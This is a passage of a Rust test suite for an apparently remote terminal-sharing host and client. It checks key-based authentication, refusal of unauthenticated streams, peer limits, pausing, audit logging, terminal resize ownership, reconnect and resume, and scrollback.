}

#[test]
fn input_reaches_the_host_in_well_under_a_frame_on_loopback() {
    let rig = Rig::new(1 << 20);
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    // Warm up, then time a key from the client until the host sees it.
    remote.send_input(b"a".to_vec()).unwrap();
    wait_until("warm up", || rig.session.typed() == b"a");
    let mut worst = Duration::ZERO;
    for i in 0..20_u8 {
        let before = rig.session.typed().len();
        let started = Instant::now();
        remote.send_input(vec![b'0' + i % 10]).unwrap();
        wait_until("key", || rig.session.typed().len() > before);
        worst = worst.max(started.elapsed());
    }
    eprintln!("worst input path on loopback: {worst:?}");
    assert!(worst < Duration::from_millis(100), "{worst:?}");
}

#[test]
fn an_unknown_key_is_refused_and_sees_nothing() {
    let rig = Rig::new(1 << 20);
    rig.session.print(b"secret screen\r\n");
    let (conn, _host) = rig.connect(1);
    let stranger = KeySigner(key());
    let err = RemoteClient::connect(
        Arc::clone(&conn) as Arc<dyn Connection>,
        "x",
        &HOST_ID,
        &stranger,
    )
    .err()
    .unwrap();
    assert!(
        matches!(err, ClientError::Denied(DenyReason::NotAuthorized)),
        "{err}"
    );
    let log = rig.audit();
    assert!(log.contains("not authorized"), "{log}");
}

#[test]
fn no_terminal_stream_is_served_before_the_handshake_ends() {
    let rig = Rig::new(1 << 20);
    rig.session.print(b"secret screen\r\n");
    let (conn, _host) = rig.connect(1);
    let control = conn.open_stream().unwrap();
    // Opening a terminal stream first, ahead of any authentication.
    let early = conn.open_stream().unwrap();
    early
        .send(&Message::Attach {
            terminal: 7,
            resume_seq: 0,
            cols: 60,
            rows: 12,
        })
        .unwrap();
    // The control stream does not say Hello: it asks for the list instead.
    control.send(&Message::ListTerminals).unwrap();
    assert_eq!(
        control.recv(Duration::from_secs(5)).unwrap(),
        Some(Message::Denied(DenyReason::Protocol))
    );
    // The early stream gets nothing at all, and ends with the connection.
    let got = early.recv(Duration::from_secs(5));
    assert!(
        !matches!(got, Ok(Some(_))),
        "an unauthenticated stream was answered: {got:?}"
    );
}

#[test]
fn a_host_with_remote_access_off_drops_the_connection() {
    let rig = Rig::new(1 << 20);
    rig.guard.set_enabled(false);
    let started = Instant::now();
    let err = rig.client(&rig.signer()).err().unwrap();
    assert!(
        matches!(err, ClientError::Net(_) | ClientError::Protocol),
        "{err}"
    );
    assert!(started.elapsed() < Duration::from_secs(5));
}

#[test]
fn a_different_machine_than_the_pinned_one_is_refused_before_signing() {
    let rig = Rig::new(1 << 20);
    let (conn, _host) = rig.connect(1);
    let err = RemoteClient::connect(conn, "build-box", &[0x11; 32], &rig.signer())
        .err()
        .unwrap();
    assert!(matches!(err, ClientError::HostMismatch));
}

/// Two machines are served at once: each sees the terminal's output, and what
/// each types reaches it.
#[test]
fn two_peers_attached_at_once_both_see_output_and_type() {
    let rig = Rig::new(1 << 20);
    rig.session.print(b"before both\r\n");
    let first = rig.client(&rig.signer()).unwrap();
    let second = rig.client(&rig.signer()).unwrap();
    let a = attach(&first);
    let b = attach(&second);
    wait_for_text(&*a, "before both");
    wait_for_text(&*b, "before both");
    rig.session.print(b"shared output\r\n");
    wait_for_text(&*a, "shared output");
    wait_for_text(&*b, "shared output");

    a.send_input(b"one".to_vec()).unwrap();
    wait_until("the first peer's keys", || rig.session.typed() == b"one");
    b.send_input(b"two".to_vec()).unwrap();
    wait_until("the second peer's keys", || {
        rig.session.typed() == b"onetwo"
    });
    first.close();
    second.close();
}

/// One machine leaving ends only its own connection: the other still sees
/// output and types.
#[test]
fn one_peer_disconnecting_leaves_the_other_attached() {
    let rig = Rig::new(1 << 20);
    let first = rig.client(&rig.signer()).unwrap();
    let second = rig.client(&rig.signer()).unwrap();
    let a = attach(&first);
    let b = attach(&second);
    rig.session.print(b"while both\r\n");
    wait_for_text(&*a, "while both");
    wait_for_text(&*b, "while both");

    first.close();
    wait_until("the first peer's stream to end", || {
        a.send_input(b"x".to_vec()).is_err() || !matches!(a.status(), SessionStatus::Running)
    });
    rig.session.print(b"after the first left\r\n");
    wait_for_text(&*b, "after the first left");
    b.send_input(b"still here".to_vec()).unwrap();
    wait_until("the second peer's keys", || {
        rig.session.typed().ends_with(b"still here")
    });
    // And it can still list and attach anew.
    assert_eq!(second.list().unwrap().len(), 1);
    let again = attach(&second);
    wait_for_text(&*again, "after the first left");
    second.close();
}

/// At most `MAX_PEERS` machines are served at once; one more is told the host
/// is busy, and gets in once a place is free.
#[test]
fn peers_beyond_the_cap_are_refused_until_one_leaves() {
    let rig = Rig::new(1 << 20);
    let clients: Vec<RemoteClient> = (0..connecto_net::host::MAX_PEERS)
        .map(|_| rig.client(&rig.signer()).unwrap())
        .collect();
    let err = rig.client(&rig.signer()).err().unwrap();
    assert!(
        matches!(err, ClientError::Denied(DenyReason::Busy)),
        "{err}"
    );
    let log = rig.audit();
    assert!(log.contains(&DenyReason::Busy.to_string()), "{log}");
    clients[0].close();
    wait_until("a place to free up", || rig.client(&rig.signer()).is_ok());
    for client in &clients[1..] {
        client.close();
    }
}

/// The latest peer to resize has the size; the others are told it. When it
/// lets go the peer before it gets its own size back, and only when no peer
/// holds it does the host's window get it back.
#[test]
fn the_latest_peer_to_resize_has_the_size_and_letting_go_hands_it_back() {
    let rig = Rig::new(1 << 20);
    let a_size = GridSize { cols: 90, rows: 30 };
    let b_size = GridSize {
        cols: 100,
        rows: 40,
    };
    let first = rig.client(&rig.signer()).unwrap();
    let second = rig.client(&rig.signer()).unwrap();
    let a = attach(&first);
    let b = attach(&second);

    a.resize(a_size);
    wait_until("the first peer has the size", || a.host_size() == a_size);
    assert_eq!(screen(&*rig.session).cols, 90);
    b.resize(b_size);
    wait_until("the second peer has the size", || b.host_size() == b_size);
    assert_eq!(screen(&*rig.session).cols, 100);
    wait_until("the first peer is told the new size", || {
        a.host_size() == b_size
    });
    // The host window's layout moves nothing while a peer has it.
    rig.session.resize(GridSize { cols: 50, rows: 10 });
    assert_eq!(screen(&*rig.session).cols, 100);

    // The first peer resizes again: it has it back.
    a.resize(a_size);
    wait_until("the first peer has it again", || {
        screen(&*rig.session).cols == 90
    });
    wait_until("the second peer is told", || b.host_size() == a_size);
    // The first peer leaves: the second, which held it before, has it again.
    first.close();
    wait_until("the second peer's own size again", || {
        screen(&*rig.session).cols == 100
    });
    wait_until("the second peer is told its size", || {
        b.host_size() == b_size
    });
    assert!(rig.session.control.lock().unwrap().0, "a peer still has it");
    // The last peer leaves: the host's window has its own size.
    second.close();
    wait_until("the host window's size", || {
        screen(&*rig.session).cols == 50
    });
    assert!(!rig.session.control.lock().unwrap().0);
}

/// A click in the host window takes the size from every peer at once, and all
/// are told; the next peer to resize takes it again.
#[test]
fn the_host_window_takes_the_size_back_from_every_peer() {
    let rig = Rig::new(1 << 20);
    let host = GridSize { cols: 60, rows: 12 };
    let first = rig.client(&rig.signer()).unwrap();
    let second = rig.client(&rig.signer()).unwrap();
    let a = attach(&first);
    let b = attach(&second);
    a.resize(GridSize { cols: 90, rows: 30 });
    wait_until("the first has it", || screen(&*rig.session).cols == 90);
    b.resize(GridSize {
        cols: 100,
        rows: 40,
    });
    wait_until("the second has it", || screen(&*rig.session).cols == 100);

    rig.session.claim_local_size();
    assert_eq!(screen(&*rig.session).cols, 60);
    wait_until("both are told the host's size", || {
        a.host_size() == host && b.host_size() == host
    });
    // The second leaving hands nothing back: no peer holds it.
    second.close();
    thread::sleep(Duration::from_millis(150));
    assert_eq!(screen(&*rig.session).cols, 60);

    a.resize(GridSize { cols: 90, rows: 30 });
    wait_until("the first takes it again", || {
        screen(&*rig.session).cols == 90
    });
    first.close();
    wait_until("the host window's size", || {
        screen(&*rig.session).cols == 60
    });
}

#[test]
fn pause_stops_typing_but_not_watching() {
    let rig = Rig::new(1 << 20);
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    remote.send_input(b"1".to_vec()).unwrap();
    wait_until("first key", || rig.session.typed() == b"1");

    rig.pause.pause();
    remote.send_input(b"2".to_vec()).unwrap();
    wait_until("the refusal", || {
        remote.last_denied() == Some(DenyReason::Paused)
    });
    thread::sleep(Duration::from_millis(100));
    assert_eq!(rig.session.typed(), b"1", "a paused host typed for a peer");
    // Output still flows.
    rig.session.print(b"still visible\r\n");
    wait_for_text(&*remote, "still visible");

    rig.pause.resume();
    remote.send_input(b"3".to_vec()).unwrap();
    wait_until("typing after resume", || rig.session.typed() == b"13");
    assert!(rig.audit().contains("relay is paused"));
}

#[test]
fn resume_after_a_dropped_link_continues_without_a_repaint() {
    let rig = Rig::new(1 << 20);
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    rig.session.print(b"one\r\ntwo\r\n");
    wait_for_text(&*remote, "two");
    assert_eq!(remote.position(), rig.session.ring.end());
    assert_eq!(remote.resyncs(), 1, "the first attach repaints");
    // The link drops. The host goes on printing.
    client.close();
    wait_until("the stream to end", || remote.is_closed());
    rig.session.print(b"three\r\nfour\r\n");

    // The same session joins a new connection and resumes. The host frees
    // its single slot a moment after the old link ends.
    let client = reconnect(&rig);
    remote.attach(&client, 7).unwrap();
    wait_for_text(&*remote, "four");
    assert_screens_equal(&*rig.session, &*remote);
    assert_eq!(remote.resyncs(), 1, "a resume must not repaint");
    assert_eq!(remote.position(), rig.session.ring.end());
}

#[test]
fn a_client_that_fell_off_the_ring_is_repainted_and_converges() {
    // A ring of 200 bytes cannot hold what was printed while away.
    let rig = Rig::new(200);
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    rig.session.print(b"\x1b[1;31mred start\x1b[0m\r\n");
    wait_for_text(&*remote, "red start");
    let position = remote.position();
    client.close();
    wait_until("the stream to end", || remote.is_closed());
    for i in 0..60 {
        rig.session
            .print(format!("line {i:03} {}\r\n", "z".repeat(30)).as_bytes());
    }
    assert!(rig.session.ring.end() - position > 200);

    let client = reconnect(&rig);
    remote.attach(&client, 7).unwrap();
    wait_for_text(&*remote, "line 059");
    wait_until("converged", || remote.position() == rig.session.ring.end());
    assert_eq!(
        remote.resyncs(),
        2,
        "falling off the ring costs one repaint"
    );
    assert_screens_equal(&*rig.session, &*remote);
    // And it keeps following afterwards.
    rig.session.print(b"after repaint\r\n");
    wait_for_text(&*remote, "after repaint");
    assert_screens_equal(&*rig.session, &*remote);
}

#[test]
fn a_flood_larger_than_the_ring_ends_with_the_same_screen() {
    let rig = Rig::new(64 * 1024);
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    let printer = {
        let session = Arc::clone(&rig.session);
        thread::spawn(move || {
            for i in 0..20_000 {
                session.print(format!("flood {i:06} {}\r\n", "y".repeat(60)).as_bytes());
            }
            session.print(b"\x1b[2J\x1b[Hdone flooding\r\n");
        })
    };
    printer.join().unwrap();
    wait_for_text(&*remote, "done flooding");
    wait_until("converged", || remote.position() == rig.session.ring.end());
    assert_screens_equal(&*rig.session, &*remote);
}

#[test]
fn the_host_grid_follows_a_resize_the_peer_asks_for() {
    let rig = Rig::new(1 << 20);
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    assert_eq!(
        remote.resize(GridSize { cols: 90, rows: 30 }),
        ResizeOutcome::Applied
    );
    wait_until("the host size", || {
        remote.host_size() == GridSize { cols: 90, rows: 30 }
    });
    assert_eq!(screen(&*rig.session).cols, 90);
    wait_until("the local grid", || screen(&*remote).cols == 90);
}

/// A click on the terminal in the host window takes the size back from the
/// peer, which is told so and draws at the host's grid; the peer's next resize
/// (a click there) takes it again. The last click decides.
#[test]
fn the_host_window_takes_the_size_back_and_the_peer_takes_it_again() {
    let rig = Rig::new(1 << 20);
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    let host = GridSize { cols: 60, rows: 12 };
    let peer = GridSize { cols: 90, rows: 30 };
    remote.resize(peer);
    wait_until("the peer has the size", || remote.host_size() == peer);
    assert_eq!(screen(&*rig.session).cols, 90);

    rig.session.claim_local_size();
    assert_eq!(screen(&*rig.session).cols, 60);
    wait_until("the peer is told the host's size", || {
        remote.host_size() == host
    });
    wait_until("the peer's grid", || screen(&*remote).cols == 60);
    // The host window's own layout now drives the terminal.
    rig.session.resize(GridSize { cols: 70, rows: 20 });
    assert_eq!(screen(&*rig.session).cols, 70);

    remote.resize(peer);
    wait_until("the peer has the size again", || remote.host_size() == peer);
    assert_eq!(screen(&*rig.session).cols, 90);
    // And the host window's layout no longer moves it.
    rig.session.resize(GridSize { cols: 50, rows: 10 });
    assert_eq!(screen(&*rig.session).cols, 90);
}

/// A host whose screen is busy drawing when the peer resizes still tells the
/// peer the size it now has, not one read from a stale or missing snapshot, so
/// the peer draws what follows at the new width.
#[test]
fn a_resize_while_the_host_screen_is_busy_reports_the_new_size() {
    let rig = Rig::new(1 << 20);
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    rig.session.busy.store(true, Ordering::SeqCst);
    assert_eq!(
        remote.resize(GridSize { cols: 90, rows: 30 }),
        ResizeOutcome::Applied
    );
    wait_until("the host size", || {
        remote.host_size() == GridSize { cols: 90, rows: 30 }
    });
    wait_until("the local grid", || screen(&*remote).cols == 90);
    rig.session.busy.store(false, Ordering::SeqCst);
    assert_eq!(screen(&*rig.session).cols, 90);
}

#[test]
fn attaching_to_a_terminal_that_does_not_exist_is_refused() {
    let rig = Rig::new(1 << 20);
    let client = rig.client(&rig.signer()).unwrap();
    let session = RemoteSession::new(
        TerminalAddr {
            host: "x".into(),
            terminal: 99,
        },
        GridSize { cols: 60, rows: 12 },
        Arc::new(|| {}),
    );
    let err = session.attach(&client, 99).err().unwrap();
    assert!(
        matches!(err, ClientError::Denied(DenyReason::NoSuchTerminal)),
        "{err}"
    );
}

#[cfg(unix)]
#[test]
fn a_real_pty_session_works_end_to_end_through_the_tap() {
    let spec = connecto_session::spec("/bin/cat", vec![], std::path::Path::new("/tmp"));
    // cat echoes the line back, once as the tty echo and once as its output.
    real_pty_end_to_end(spec, "hello from afar");
}

/// The same with PowerShell in a ConPTY: the line comes back as the echo of
/// `Read-Host` and then as its output.
#[cfg(windows)]
#[test]
fn a_real_pty_session_works_end_to_end_through_the_tap() {
    let spec = connecto_session::shell_spec(
        Some("$line = Read-Host; Write-Output ('got:' + $line); Start-Sleep -Seconds 30"),
        &std::env::temp_dir(),
    );
    real_pty_end_to_end(spec, "got:hello from afar");
}

/// Run `spec` in a real PTY shared through the tap, type a line from the
/// peer, wait for `needle` there, and compare the two screens.
fn real_pty_end_to_end(mut spec: connecto_pty::PtySpec, needle: &str) {
    use connecto_pty::OpenPty;
    use connecto_session::LiveSession;

    let size = GridSize { cols: 60, rows: 12 };
    let ring = Arc::new(Ring::new(1 << 20));
    let pty = OpenPty::open(size).unwrap();
    spec.size = size;
    let live = Arc::new(
        LiveSession::start_tapped(
            pty,
            spec,
            Arc::new(|| {}),
            Some(Arc::new(RingTap::recording(Arc::clone(&ring)))),
        )
        .unwrap(),
    );
    let rig = Rig::new(1 << 20);
    let terminals = Arc::new(FixedTerminals(Mutex::new(vec![HostTerminal {
        entry: None,
        ran: true,
        owner: None,
        background: Vec::new(),
        id: 7,
        name: "cat".into(),
        tool: 3,
        project_id: "p".into(),
        project_name: "Project".into(),
        parent: None,
        attempt: 1,
        activity: 0,
        session: Arc::clone(&live) as Arc<dyn TerminalSession>,
        ring: Arc::clone(&ring),
    }])));
    let text_keys = format!("{}\n", rig.allowed.public_key().to_openssh().unwrap());
    let keys = Arc::new(AuthorizedKeySet::parse(&text_keys).unwrap());
    let host = Arc::new(HostService::new(
        terminals,
        Arc::new(move || Arc::clone(&keys)),
        Arc::clone(&rig.guard) as Arc<dyn RemoteGuard>,
    ));
    let (client_conn, host_conn) = loopback::pair(CLIENT_ID, HOST_ID, [5; 32]);
    let service = Arc::clone(&host);
    thread::spawn(move || service.serve(&host_conn));
    let client =
        RemoteClient::connect(Arc::new(client_conn), "pty-host", &HOST_ID, &rig.signer()).unwrap();
    client.list().unwrap();
    let remote = attach(&client);
    remote.send_input(b"hello from afar\r".to_vec()).unwrap();
    wait_for_text(&*remote, needle);
    assert_screens_equal(&*live, &*remote);
    live.terminate();
}

#[test]
fn the_host_view_follows_the_peer_once_it_resizes_and_takes_its_size_back_after() {
    let rig = Rig::new(1 << 20);
    let host_view = GridSize { cols: 60, rows: 12 };
    let peer_view = GridSize {
        cols: 100,
        rows: 30,
    };
    let grid = || {
        let snap = screen(&*rig.session);
        GridSize {
            cols: snap.cols,
            rows: snap.rows,
        }
    };
    assert_eq!(grid(), host_view);

    let client = rig.client(&rig.signer()).unwrap();
    let session = RemoteSession::new(
        TerminalAddr {
            host: "x".into(),
            terminal: 7,
        },
        host_view,
        Arc::new(|| {}),
    );
    session.attach(&client, 7).unwrap();
    // The peer's window shows the terminal: its size goes to the host.
    assert_eq!(session.resize(peer_view), ResizeOutcome::Applied);
    wait_until("the host to take the peer's size", || grid() == peer_view);
    assert!(
        rig.session.control.lock().unwrap().0,
        "the peer has the size"
    );

    // The host window's layout asks for its own size: it does not move the terminal.
    assert_eq!(rig.session.resize(host_view), ResizeOutcome::Applied);
    thread::sleep(Duration::from_millis(100));
    assert_eq!(grid(), peer_view);

    // A resize from the peer still goes through.
    assert_eq!(
        session.resize(GridSize { cols: 90, rows: 25 }),
        ResizeOutcome::Applied
    );
    wait_until("the peer's resize", || {
        grid() == GridSize { cols: 90, rows: 25 }
    });

    // The peer detaches: the host view takes the size back.
    client.close();
    wait_until("the host to get its size back", || grid() == host_view);
    assert!(!rig.session.control.lock().unwrap().0);
}

/// A paired machine attaches every terminal in the background. One its window
/// never showed must not pin the host's size: the host window going full
/// screen has to reach the terminal.
#[test]
fn a_background_attach_leaves_the_host_size_to_the_host_window() {
    let rig = Rig::new(1 << 20);
    let grid = || {
        let snap = screen(&*rig.session);
        GridSize {
            cols: snap.cols,
            rows: snap.rows,
        }
    };
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    wait_until("attached", || remote.is_linked());
    assert!(
        !rig.session.control.lock().unwrap().0,
        "nobody took the size"
    );

    let full = GridSize {
        cols: 180,
        rows: 50,
    };
    assert_eq!(rig.session.resize(full), ResizeOutcome::Applied);
    assert_eq!(grid(), full);
    // A later attach, as a reconnect does, changes nothing either.
    client.close();
    let again = reconnect(&rig);
    remote.attach(&again, 7).unwrap();
    thread::sleep(Duration::from_millis(100));
    assert_eq!(grid(), full);
    again.close();
}

/// After a reconnect the peer's view asks for its size again, since the pane
/// only resizes when its own size changes.
#[test]
fn a_reattach_asks_for_the_size_the_peer_view_had() {
    let rig = Rig::new(1 << 20);
    let grid = || {
        let snap = screen(&*rig.session);
        GridSize {
            cols: snap.cols,
            rows: snap.rows,
        }
    };
    let peer_view = GridSize {
        cols: 100,
        rows: 30,
    };
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    assert_eq!(remote.resize(peer_view), ResizeOutcome::Applied);
    wait_until("the peer's size", || grid() == peer_view);
    client.close();
    wait_until("the host size back", || {
        grid() == GridSize { cols: 60, rows: 12 }
    });

    let again = reconnect(&rig);
    remote.attach(&again, 7).unwrap();
    wait_until("the peer's size again", || grid() == peer_view);
    wait_until("the local grid", || remote.host_size() == peer_view);
    again.close();
}

/// A paired Mac that sleeps reconnects on every dark wake. Its view was last
/// used long ago, so the reattach leaves the host's size alone (each resize
/// made the program repaint, piling copies into the scrollback); the next use
/// takes the view's size again.
#[test]
fn a_reattach_long_after_the_view_was_used_waits_for_the_next_use() {
    let rig = Rig::new(1 << 20);
    let grid = || {
        let snap = screen(&*rig.session);
        GridSize {
            cols: snap.cols,
            rows: snap.rows,
        }
    };
    let host = GridSize { cols: 60, rows: 12 };
    let peer_view = GridSize {
        cols: 100,
        rows: 30,
    };
    let offset = Arc::new(AtomicU64::new(0));
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    let clock = Arc::clone(&offset);
    remote.set_clock(Arc::new(move || {
        SystemTime::now() + Duration::from_secs(clock.load(Ordering::SeqCst))
    }));
    assert_eq!(remote.resize(peer_view), ResizeOutcome::Applied);
    wait_until("the peer's size", || grid() == peer_view);
    client.close();
    wait_until("the host size back", || grid() == host);

    // An hour of sleep, then a dark wake.
    offset.store(3600, Ordering::SeqCst);
    let again = reconnect(&rig);
    remote.attach(&again, 7).unwrap();
    wait_until("attached", || remote.is_linked());
    thread::sleep(Duration::from_millis(150));
    assert_eq!(grid(), host, "nobody used it: the host keeps its size");

    // The person comes back and types: the view's size goes first.
    rig.session.order.lock().unwrap().clear();
    remote.send_input(b"x".to_vec()).unwrap();
    wait_until("the peer's size again", || grid() == peer_view);
    wait_until("the keystroke", || rig.session.typed().ends_with(b"x"));
    assert_eq!(
        *rig.session.order.lock().unwrap(),
        ["resize", "input"],
        "the held size reaches the host ahead of the keystroke"
    );
    again.close();
}

#[test]
fn a_peer_adds_renames_restarts_and_closes_terminals_and_each_is_audited() {
    let rig = Rig::new(1 << 20);
    let client = rig.client(&rig.signer()).unwrap();
    assert_eq!(
        client
            .manage(ManageOp::Add {
                tool: 2,
                name: Some("review".into()),
                project: None,
                model: None,
            })
            .unwrap(),
        Some(99)
    );
    client
        .manage(ManageOp::Rename {
            terminal: 7,
            name: Some("main".into()),
        })
        .unwrap();
    client.manage(ManageOp::Restart { terminal: 7 }).unwrap();
    client.manage(ManageOp::Close { terminal: 7 }).unwrap();
    assert_eq!(
        *rig.managed.ops.lock().unwrap(),
        [
            ManageOp::Add {
                tool: 2,
                name: Some("review".into()),
                project: Some("p".into()),
                model: None,
            },
            ManageOp::Rename {
                terminal: 7,
                name: Some("main".into())
            },
            ManageOp::Restart { terminal: 7 },
            ManageOp::Close { terminal: 7 },
        ]
    );
    let log = rig.audit();
    for action in ["add", "rename", "restart", "close"] {
        assert!(
            log.contains(&format!("\"action\":\"{action}\"")),
            "{action}: {log}"
        );
    }
    assert!(log.matches("\"actor\":\"remote\"").count() >= 4);
}

#[test]
fn pause_refuses_managing_terminals_and_the_host_never_acts() {
    let rig = Rig::new(1 << 20);
    let client = rig.client(&rig.signer()).unwrap();
    rig.pause.pause();
    for op in [
        ManageOp::Add {
            tool: 1,
            name: None,
            project: None,
            model: None,
        },
        ManageOp::Close { terminal: 7 },
        ManageOp::Restart { terminal: 7 },
        ManageOp::Rename {
            terminal: 7,
            name: None,
        },
    ] {
        let err = client.manage(op).unwrap_err();
        assert!(
            matches!(&err, ClientError::Remote(why) if why.contains("paused")),
            "{err}"
        );
    }
    assert!(
        rig.managed.ops.lock().unwrap().is_empty(),
        "the host acted while paused"
    );
    let log = rig.audit();
    assert_eq!(log.matches("\"decision\":\"deny\"").count(), 4, "{log}");
    // After Resume it works again.
    rig.pause.resume();
    client.manage(ManageOp::Restart { terminal: 7 }).unwrap();
    assert_eq!(rig.managed.ops.lock().unwrap().len(), 1);
}

#[test]
fn a_terminal_that_is_not_there_and_a_host_refusal_come_back_as_errors() {
    let rig = Rig::new(1 << 20);
    let client = rig.client(&rig.signer()).unwrap();
    let err = client.manage(ManageOp::Close { terminal: 99 }).unwrap_err();
    assert!(
        matches!(&err, ClientError::Remote(why) if why.contains("no such terminal")),
        "{err}"
    );
    assert!(rig.managed.ops.lock().unwrap().is_empty());
    *rig.managed.refuse.lock().unwrap() = Some("the last terminal cannot be closed".into());
    let err = client.manage(ManageOp::Close { terminal: 7 }).unwrap_err();
    assert!(
        matches!(&err, ClientError::Remote(why) if why.contains("last terminal")),
        "{err}"
    );
}

#[test]
fn nothing_can_be_managed_before_the_handshake_ends() {
    let rig = Rig::new(1 << 20);
    let (conn, _host) = rig.connect(1);
    let control = conn.open_stream().unwrap();
    control
        .send(&Message::Manage {
            req: 1,
            op: ManageOp::Close { terminal: 7 },
        })
        .unwrap();
    assert_eq!(
        control.recv(Duration::from_secs(5)).unwrap(),
        Some(Message::Denied(DenyReason::Protocol))
    );
    assert!(rig.managed.ops.lock().unwrap().is_empty());
}

#[test]
fn a_terminal_that_ran_before_hosting_was_on_is_shared_from_a_repaint() {
    use std::sync::atomic::{AtomicBool, Ordering};

    use connecto_core::OutputTap;
    let rig = Rig::new(1 << 20);
    // Output while nobody can look: numbered, not kept.
    let record = Arc::new(AtomicBool::new(false));
    let tap = RingTap::new(Arc::clone(&rig.session.ring), Arc::clone(&record));
    tap.feed(b"typed before hosting\r\n", &mut |b| {
        rig.session.emulator.feed(b)
    });
    assert!(rig.session.ring.end() > 0);

    // Hosting is turned on; a peer attaches without any restart.
    record.store(true, Ordering::Relaxed);
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    wait_for_text(&*remote, "typed before hosting");
    tap.feed(b"and after\r\n", &mut |b| rig.session.emulator.feed(b));
    wait_for_text(&*remote, "and after");
    assert_screens_equal(&*rig.session, &*remote);
    assert_eq!(remote.resyncs(), 1);
}

/// What ran before a peer attached is in its scrollback: scrolling back in the
/// peer's view shows the host's history, not only lines printed since. A peer
/// used to be given the visible screen alone, so it had nothing to scroll to.
#[test]
fn a_peer_scrolls_back_into_history_from_before_it_attached() {
    let rig = Rig::new(1 << 20);
    for i in 0..100 {
        rig.session
            .print(format!("history line {i}\r\n").as_bytes());
    }
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    wait_for_text(&*remote, "history line 99");
    assert_screens_equal(&*rig.session, &*remote);

    wait_until("the peer scrolled back", || remote.scroll(60));
    let shown = text(&screen(&*remote));
    assert!(shown.contains("history line 40"), "{shown}");
    wait_until("the peer scrolled to the top", || remote.scroll(1000));
    let top = text(&screen(&*remote));
    assert!(top.starts_with("history line 0\n"), "{top}");
}

/// The host's own view scrolled back when a peer attaches: the peer still gets
/// the live screen with the history above it, and output goes on from there.
#[test]
fn a_peer_attaching_while_the_host_is_scrolled_back_gets_the_live_screen() {
    let rig = Rig::new(1 << 20);
    for i in 0..100 {
        rig.session
            .print(format!("history line {i}\r\n").as_bytes());
    }
    wait_until("the host scrolled back", || rig.session.scroll(50));
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    wait_for_text(&*remote, "history line 99");
    rig.session.print(b"one more\r\n");
    wait_for_text(&*remote, "one more");
    let shown = text(&screen(&*remote));
    assert!(shown.contains("history line 99\none more"), "{shown}");
    // The host's view stayed where its user put it.
    assert!(screen(&*rig.session).display_offset > 0);

    wait_until("the peer scrolled to the top", || remote.scroll(1000));
    let top = text(&screen(&*remote));
    assert!(top.starts_with("history line 0\n"), "{top}");
}

/// A program that starts each synchronized update as it ends the last never
/// lets one end on its own; a peer still attaches, and sees what was drawn.
#[test]
fn a_peer_attaches_while_synchronized_updates_follow_each_other() {
    use std::sync::atomic::AtomicBool;
    let rig = Rig::new(1 << 20);
    rig.session.print(b"\x1b[?2026hframe 0");
    let stop = Arc::new(AtomicBool::new(false));
    let drawing = {
        let (session, stop) = (Arc::clone(&rig.session), Arc::clone(&stop));
        thread::spawn(move || {
            let mut n = 1;
            while !stop.load(Ordering::SeqCst) {
                thread::sleep(Duration::from_millis(20));
                session.print(format!("\x1b[?2026l\x1b[H\x1b[?2026hframe {n}").as_bytes());
                n += 1;
            }
        })
    };
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    wait_for_text(&*remote, "frame");
    stop.store(true, Ordering::SeqCst);
    drawing.join().unwrap();
    rig.session.print(b"\x1b[?2026l\x1b[Hdone   ");
    wait_for_text(&*remote, "done");
    assert_screens_equal(&*rig.session, &*remote);
}

/// A stopped terminal has no screen (0x0). Attaching to it, as the chat app
/// does with a project's `app-session` at once, gets a usable size: a 0x0
/// reply is a bad frame to the peer, which dropped the link and reconnected
/// for good.
#[test]
fn attaching_to_a_stopped_terminal_gets_a_usable_size() {
    let rig = Rig::new(1 << 20);
    rig.session.stopped.store(true, Ordering::SeqCst);
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    let shown = screen(&*remote);
    assert!(
        shown.cols > 0 && shown.rows > 0,
        "{}x{}",
        shown.cols,
        shown.rows
    );
    // The link is still up: the host's list is read on it afterwards.
    assert_eq!(client.listing().unwrap().terminals.len(), 1);
}

/// A terminal with no output, in `project`, started by `parent`.
fn terminal(id: u32, project: &str, parent: Option<u32>) -> HostTerminal {
    let session = FakeSession::new(1024);
    HostTerminal {
        entry: None,
        ran: true,
        owner: None,
        background: Vec::new(),
        id,
        name: format!("t{id}"),
        tool: 1,
        project_id: project.to_owned(),
        project_name: format!("Name of {project}"),
        parent,
        attempt: 1,
        activity: 0,
        ring: Arc::clone(&session.ring),
        session: session as Arc<dyn TerminalSession>,
    }
}

/// A terminal whose output and input are `session`.
fn terminal_on(session: &Arc<FakeSession>, id: u32, project: &str) -> HostTerminal {
    HostTerminal {
        entry: None,
        ran: true,
        owner: None,
        background: Vec::new(),
        id,
        name: format!("t{id}"),
        tool: 1,
        project_id: project.to_owned(),
        project_name: format!("Name of {project}"),
        parent: None,
        attempt: 1,
        activity: 0,
        ring: Arc::clone(&session.ring),
        session: Arc::clone(session) as Arc<dyn TerminalSession>,
    }
}

#[test]
fn projects_and_nesting_survive_the_wire_in_the_hosts_order() {
    let session = FakeSession::new(1 << 20);
    let list = vec![
        terminal(1, "p1", None),
        terminal(2, "p1", Some(1)),
        terminal(3, "p2", None),
    ];
    let rig = Rig::with_list(list, session);
    let client = rig.client(&rig.signer()).unwrap();
    let got: Vec<(u32, String, String, Option<u32>)> = client
        .list()
        .unwrap()
        .into_iter()
        .map(|(_, info)| (info.id, info.project_id, info.project_name, info.parent))
        .collect();
    assert_eq!(
        got,
        vec![
            (1, "p1".into(), "Name of p1".into(), None),
            (2, "p1".into(), "Name of p1".into(), Some(1)),
            (3, "p2".into(), "Name of p2".into(), None),
        ]
    );
}

#[test]
fn a_host_with_more_terminals_than_a_list_holds_offers_the_first_sixty_four() {
